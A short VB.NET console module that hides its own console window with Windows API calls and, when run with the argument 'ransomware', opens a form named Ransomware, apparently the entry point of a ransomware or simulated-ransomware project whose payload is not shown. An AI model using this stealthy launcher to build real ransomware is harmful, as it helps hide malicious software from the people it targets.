Module Module1

    Private Declare Auto Function ShowWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
    Private Declare Auto Function GetConsoleWindow Lib "kernel32.dll" () As IntPtr
    Private Const SW_HIDE As Integer = 0

    Sub Main()
        Dim hWndConsole As IntPtr
        hWndConsole = GetConsoleWindow()
        ShowWindow(hWndConsole, SW_HIDE)

        If System.Environment.GetCommandLineArgs.ToArray.Length > 1 Then

            If System.Environment.GetCommandLineArgs.ToArray.GetValue(1).ToString.Equals("ransomware") Then
                Dim ransomwareForm As Ransomware = New Ransomware
                ransomwareForm.Show()

            End If

        End If

        'MsgBox(System.Environment.GetCommandLineArgs.ToArray.GetValue(1))
        'MsgBox(System.Environment.GetCommandLineArgs.ToArray.GetValue(2))

        Console.ReadKey()

    End Sub

End Module
